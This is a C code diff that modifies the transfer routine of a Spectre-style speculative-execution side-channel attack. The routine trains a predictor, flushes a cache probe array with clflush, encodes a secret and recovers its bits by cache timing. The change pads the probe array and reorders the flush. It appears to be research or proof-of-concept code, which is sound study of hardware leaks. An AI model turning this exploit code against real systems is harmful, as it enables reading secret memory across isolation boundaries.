@@ -69,7 +69,7 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
          uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride, uint64_t train_data_length)
 {
     // creating transfer array
-    uint8_t side_channel[(bits_count + 1) * stride];
+    uint8_t side_channel[((bits_count + 1) * stride) + 4096];
     uint32_t out_index = 0;
     bool training;
 
@@ -82,10 +82,16 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
     // empty the output
     uint64_t out = 0;
 
-    memset(side_channel,5, (bits_count + 1) * stride);
+    memset(side_channel,5, ((bits_count + 1) * stride) + 4096);
 
     for (uint32_t i; i < train_data_length * stride; i++)
         clflush(&train_data[i]);
+
+    // flushing the transfer array, before encoding data into it
+    for (uint32_t i = 0; i < ((bits_count + 1) * stride) + 4096; i++)
+        clflush(&side_channel[i]);
+
+    maccess(&in);
 
     lfence();
     mfence();
@@ -96,22 +102,13 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
         for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
         {
             // using 0 as secret, so no adresses are loaded into cache
-            training = leak_data(i, train_data, train_data_length * stride, 0, side_channel, bits_count, stride);
+            training = leak_data(i, train_data, train_data_length * stride, 0, side_channel+4096, bits_count, stride);
             //printf("Training: %d\n", training);
         }
     }
 
-    // flushing the transfer array, before encoding data into it
-    for (uint32_t i = 0; i < (bits_count + 1) * stride; i++)
-        clflush(&side_channel[i]);
-
-    maccess(&in);
-
-    lfence();
-    mfence();
-    
     // writing secret into the side channel array
-    training = leak_data((train_data_length * stride), train_data, train_data_length * stride, in, side_channel, bits_count, stride);
+    training = leak_data((train_data_length * stride), train_data, train_data_length * stride, in, side_channel+4096, bits_count, stride);
     printf("Training: %d\n", training);
 
     char binaryResult[bits_count + 1];
@@ -119,7 +116,7 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
     // reading data from the side channel array
     for (uint32_t i = 1; i < bits_count + 1; i++)
     {
-        if (is_cached(side_channel + (i * stride), threshold)){
+        if (is_cached((side_channel + 4096) + (i * stride), threshold)){
             out += DOUBLE_TIMES(1, (i-1) % 8);
             binaryResult[i-1] = '1';
         }
